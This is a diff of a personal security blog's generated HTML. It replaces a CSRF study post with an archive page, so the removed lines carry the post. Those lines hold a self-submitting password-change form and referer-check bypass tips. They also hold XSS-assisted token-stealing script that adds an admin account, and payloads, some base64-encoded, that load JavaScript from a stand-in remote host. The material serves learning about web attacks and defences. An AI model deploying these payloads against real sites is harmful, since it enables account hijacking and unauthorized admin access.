@@ -6,19 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>csrf | welcome to my blogs</title>
+  <title>Archives: 2018/8 | welcome to my blogs</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="请求方式get利用html里的带src属性的元素发出跨域请求">
-<meta property="og:type" content="article">
-<meta property="og:title" content="csrf">
-<meta property="og:url" content="http://yoursite.com/2018/06/09/summary-csrf/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="welcome to my blogs">
+<meta property="og:url" content="http://yoursite.com/archives/2018/08/index.html">
 <meta property="og:site_name" content="welcome to my blogs">
-<meta property="og:description" content="请求方式get利用html里的带src属性的元素发出跨域请求">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-07-17T15:29:26.455Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="csrf">
-<meta name="twitter:description" content="请求方式get利用html里的带src属性的元素发出跨域请求">
+<meta name="twitter:title" content="welcome to my blogs">
   
     <link rel="alternative" href="/atom.xml" title="welcome to my blogs" type="application/atom+xml">
   
@@ -155,71 +151,39 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-summary-csrf" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      csrf
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2018" class="archive-year">2018</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2018/08/21/summary-xss/" class="archive-article-date">
+  	<time datetime="2018-08-21T06:02:19.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-21</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2018/08/21/summary-xss/">xss</a>
     </h1>
   
 
 
 
-        
-        <a href="/2018/06/09/summary-csrf/" class="archive-article-date">
-  	<time datetime="2018-06-09T09:18:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-06-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h2><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>利用html里的带src属性的元素发出跨域请求<br><a id="more"></a><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"refresh"</span> <span class="attr">content</span>=<span class="string">"0"</span>;<span class="attr">url</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">"url"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"url"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">table</span> <span class="attr">background</span>=<span class="string">"url"</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure></p>
-<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">id</span>=<span class="string">"hack"</span> <span class="attr">action</span>=<span class="string">"url"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"passwd_new"</span> <span class="attr">value</span>=<span class="string">"csrf"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"passwd_conf"</span> <span class="attr">value</span>=<span class="string">"csrf"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).submit();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><h3 id="验证referer"><a href="#验证referer" class="headerlink" title="验证referer"></a>验证referer</h3><ul>
-<li><p>data:协议访问和https向http跳转时候referer为空</p>
-</li>
-<li><p>把文件放在一个GOOGLE.COM的目录，绕过关键字验证</p>
-<h3 id="使用验证码"><a href="#使用验证码" class="headerlink" title="使用验证码"></a>使用验证码</h3><p>影响用户体验</p>
-<h3 id="使用csrf-token"><a href="#使用csrf-token" class="headerlink" title="使用csrf token"></a>使用csrf token</h3><p>攻击者无法使用js获取外域页面的token值，遵循同源策略</p>
-</li>
-</ul>
-<h3 id="配合xss攻击"><a href="#配合xss攻击" class="headerlink" title="配合xss攻击"></a>配合xss攻击</h3><p>如果网站还存在着一个xss漏洞，可以用xss窃取同域的csrftoken然后发起csrf攻击<br>可以在有xss漏洞的页面嵌入以下代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"../csrf"</span> <span class="attr">onload</span>=<span class="string">alert(frames[0].document.getElementsByName(</span>'<span class="attr">user_token</span>')[<span class="attr">0</span>]<span class="attr">.value</span>)&gt;</span><span class="comment">&lt;!--成功--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"../csrf"</span> <span class="attr">onload</span>=<span class="string">window.open(</span>"<span class="attr">..</span>/<span class="attr">csrf</span>/?<span class="attr">password_new</span>=<span class="string">admin&amp;password_conf</span>=<span class="string">admin&amp;Change</span>=<span class="string">Change&amp;user_token</span>=<span class="string">"+frames[0].document.getElementsByName('user_token')[0].value+"</span>#")&gt;</span></span><br><span class="line"><span class="comment">&lt;!--失败 报错csrf token is incorrect 用window.open重新打开一个以面后token刷新了--&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>没有过滤script关键字<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> frameObj = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">    frameObj.setAttribute(<span class="string">"id"</span>, <span class="string">"add"</span>);</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(frameObj);</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"add"</span>).src = <span class="string">"admin.php?c=admin&amp;f=save"</span>;</span><br><span class="line">    <span class="keyword">var</span> token = <span class="built_in">document</span>.getElementById(<span class="string">"add"</span>).contentWindow.document.getElementById(<span class="string">"token"</span>).value; <span class="comment">//从iframe中的页面中获取token值</span></span><br><span class="line">    <span class="keyword">var</span> xmlhttp;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest) &#123; <span class="comment">// code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">        xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// code for IE6, IE5</span></span><br><span class="line">        xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"admin.php?c=admin&amp;f=save"</span>, <span class="literal">true</span>);</span><br><span class="line">    xmlhttp.send(<span class="string">"id=1&amp;accont=wooyun&amp;pass=123456&amp;status=1&amp;if_system=1&amp;token="</span>+token); <span class="comment">//带上token提交添加管理员的请求</span></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>过滤关键字，加载远程的js代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">document.body.appendChild(document.createElement(</span>'<span class="attr">script</span>'))<span class="attr">.src</span>=<span class="string">'url'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4="</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4="</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://xxx.xxx/a.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>dark吉dark利，今van吃鸡<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
+        <div class="article-info info-on-right">
+          
+          
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
 		<ul class="article-tag-list">
@@ -232,167 +196,17 @@
 	</div>
 
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/06/09/summary-csrf/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2018/06/21/CTF-SCTF2018/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          SCTF2018伪wp
-        
-      </div>
-    </a>
   
   
-    <a href="/2018/06/02/summary-xxe/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">xxe</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#请求方式"><span class="toc-number">1.</span> <span class="toc-text">请求方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#get"><span class="toc-number">1.1.</span> <span class="toc-text">get</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#post"><span class="toc-number">1.2.</span> <span class="toc-text">post</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御方法"><span class="toc-number">2.</span> <span class="toc-text">防御方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#验证referer"><span class="toc-number">2.1.</span> <span class="toc-text">验证referer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用验证码"><span class="toc-number">2.2.</span> <span class="toc-text">使用验证码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用csrf-token"><span class="toc-number">2.3.</span> <span class="toc-text">使用csrf token</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#配合xss攻击"><span class="toc-number">2.4.</span> <span class="toc-text">配合xss攻击</span></a></li></ol></li></ol>
-                    </div>
-                </span>
-            </div>
-        </div>
-        
-    </div>
-</aside>
-
-
-
-  
-  <div class="duoshuo">
-	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="summary-csrf" data-title="csrf" data-url="http://yoursite.com/2018/06/09/summary-csrf/"></div>
-	<!-- 多说评论框 end -->
-	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
-	<script type="text/javascript">
-	var duoshuoQuery = {short_name:"true"};
-	(function() {
-		var ds = document.createElement('script');
-		ds.type = 'text/javascript';ds.async = true;
-		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-		ds.charset = 'UTF-8';
-		(document.getElementsByTagName('head')[0] 
-		 || document.getElementsByTagName('body')[0]).appendChild(ds);
-	})();
-	</script>
-	<!-- 多说公共JS代码 end -->
-</div>
-
-  
-  
-  
-  <div id="cloud-tie-wrapper" class="cloud-tie-wrapper"></div>
-<script>
-  var cloudTieConfig = {
-    url: "http://yoursite.com/2018/06/09/summary-csrf/", 
-    sourceId: "summary-csrf",
-    productKey: "true",
-    target: "cloud-tie-wrapper"
-  };
-</script>
-<script src="//img1.cache.netease.com/f2e/tie/yun/sdk/loader.js"></script>
+    </div></section>
   
 
-  
-  <div id="SOHUCS" sid="summary-csrf" ></div> 
-<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
-<script type="text/javascript">
-    window.changyan.api.config({
-        appid: "true",
-        conf: "true"
-    });
-</script>
-</script>
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -416,8 +230,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
-		isArchive: false,
+		isPost: false,
+		isArchive: true,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
